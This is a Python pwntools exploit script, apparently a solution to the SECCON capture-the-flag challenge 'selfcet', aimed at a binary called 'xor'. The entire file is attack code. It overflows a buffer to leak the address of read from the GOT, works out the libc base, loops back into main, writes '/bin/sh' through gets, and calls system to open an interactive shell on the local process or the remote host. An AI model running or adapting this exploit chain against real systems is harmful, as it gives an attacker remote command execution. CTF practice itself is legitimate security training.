#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "selfcet.seccon.games"
PORT = 9999
PROCESS = "./xor"


def exploit(r):
    payload1 = "\x00"*0x20              # key
    payload1 += "C"*0x20                # buf
    payload1 += p64(0x404000)           # error
    payload1 += p64(e.got["read"])      # status
    payload1 += p64(0x40d0)[:2]         # throw

    r.send(payload1)

    r.recvuntil("xor: ")
    LEAK = u64(r.recv(6).ljust(8, "\x00"))
    libc.address = LEAK - libc.symbols["read"]

    log.info("LEAK        : %s" % hex(LEAK))
    log.info("LIBC        : %s" % hex(libc.address))

    pause()

    payload1 = "A"*0x20
    payload1 += p64(0x401209)
    payload1 += p64(0x4)
    payload1 += p64(libc.symbols["__libc_start_main"])
    r.send(payload1)

    pause()

    # back in main at first payload
    payload1 = "A"*0x20
    payload1 += "C"*0x20
    payload1 += p64(0x404500)
    payload1 += p64(0x404500)
    payload1 += p64(libc.symbols["gets"])

    r.send(payload1)

    pause()

    r.sendline("/bin/sh\x00")

    log.info("calling main")
    pause()

    payload1 = "A"*0x20
    payload1 += p64(0x401209)
    payload1 += p64(0x404500)
    payload1 += p64(libc.symbols["system"])
    r.send(payload1)

    r.interactive()

    return


if __name__ == "__main__":
    e = ELF("./xor")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./xor", env={"LD_PRELOAD": "./libc.so.6"})
        print(util.proc.pidof(r))
        pause()

    exploit(r)
